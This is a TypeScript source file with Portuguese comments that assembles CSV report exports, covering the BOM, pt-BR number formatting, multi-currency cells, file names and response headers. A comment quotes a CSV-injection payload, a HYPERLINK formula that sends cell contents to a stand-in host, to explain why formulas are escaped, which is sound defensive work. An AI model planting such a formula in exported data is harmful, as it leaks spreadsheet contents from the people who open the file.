import { escapeCsv } from '../csv'
import type { QuantiaPorMoeda } from './metricas'

/**
 * A montagem de um CSV de relatório.
 *
 * Reusa `escapeCsv`, que **neutraliza fórmula** — e isso não é zelo abstrato
 * aqui: a descrição de um item de proposta é texto que alguém digitou, e o
 * nome de um produto também. Um item chamado
 * `=HYPERLINK("http://x/?"&A1,"erro")` vira fórmula viva quando a clínica abre
 * o arquivo, e exfiltra a planilha sem nada parecer errado. O alvo do ataque
 * não é o nosso sistema; é o Excel de quem exporta.
 *
 * ## Por que CSV, e não XLSX
 *
 * Porque o destino é uma planilha, e CSV é o formato que as três abrem sem
 * biblioteca nenhuma. Escrever XLSX exigiria montar um zip com XML a mão — o
 * projeto já tem um LEITOR nesse espírito (`lib/documentos/xlsx.ts`, escrito
 * porque SheetJS tem CVE e `exceljs` precisa de streams do Node que o workerd
 * não tem), e um escritor seria o mesmo custo por uma conveniência de formato.
 */

export interface ColunaDeCsv<T> {
    titulo: string
    valor: (linha: T) => string | number | null | undefined
}

/**
 * O BOM de UTF-8, na frente do arquivo.
 *
 * Sem ele o Excel do Windows lê o arquivo como latin-1 e "Avaliação" vira
 * "AvaliaÃ§Ã£o" — num relatório em português isso atinge quase toda linha. Os
 * outros leitores ignoram o BOM.
 */
const BOM = '﻿'

export function montarCsv<T>(colunas: readonly ColunaDeCsv<T>[], linhas: readonly T[]): string {
    const cabecalho = colunas.map((c) => escapeCsv(c.titulo)).join(',')
    const corpo = linhas.map((linha) =>
        colunas
            .map((c) => {
                const v = c.valor(linha)
                if (v === null || v === undefined) return ''
                return escapeCsv(typeof v === 'number' ? numeroPtBr(v) : v)
            })
            .join(',')
    )
    // `\r\n` é o que a RFC 4180 pede, e é o que o Excel espera em arquivo salvo.
    return BOM + [cabecalho, ...corpo].join('\r\n') + '\r\n'
}

/**
 * Número com vírgula decimal, porque o destino é uma planilha em pt-BR.
 *
 * Com ponto, o Excel configurado em português lê `1200.50` como **texto** — a
 * célula alinha à esquerda e não entra em soma nenhuma, que é o primeiro
 * movimento de quem abre o arquivo. Sem separador de milhar, de propósito: o
 * ponto de milhar é o que confunde o parser na direção oposta.
 */
function numeroPtBr(n: number): string {
    if (!Number.isFinite(n)) return ''
    return String(n).replace('.', ',')
}

/**
 * Uma lista de quantias por moeda, em uma célula.
 *
 * `null` nunca é somado entre moedas (ver `somarPorMoeda`), e o CSV preserva
 * isso: "1.200,00 BRL · 300,00 USD" numa célula é honesto, e um total único
 * seria um número que não é dinheiro nenhum. Com uma moeda só — o caso de
 * quase toda unidade — a célula se lê como um valor.
 */
export function quantiasEmTexto(quantias: readonly QuantiaPorMoeda[]): string {
    if (quantias.length === 0) return ''
    return quantias.map((q) => `${numeroPtBr(q.total)} ${q.moeda}`).join(' · ')
}

/** O nome do arquivo, com o período no nome — é o que o distingue na pasta. */
export function nomeDoArquivo(relatorio: string, de: string, ate: string): string {
    const limpo = (s: string) => s.slice(0, 10)
    return `${relatorio}-${limpo(de)}-a-${limpo(ate)}.csv`
}

/**
 * Os cabeçalhos da resposta.
 *
 * `text/csv` com `charset=utf-8` (o BOM ajuda, mas o cabeçalho é o que o
 * navegador lê primeiro) e `Content-Disposition: attachment`, senão o Chrome
 * abre o CSV como texto na aba e a pessoa perde o arquivo.
 */
export function cabecalhosDeCsv(nome: string): Record<string, string> {
    return {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="${nome}"`,
        // Relatório é dado de cliente: não deve ficar em cache de proxy.
        'Cache-Control': 'no-store',
    }
}
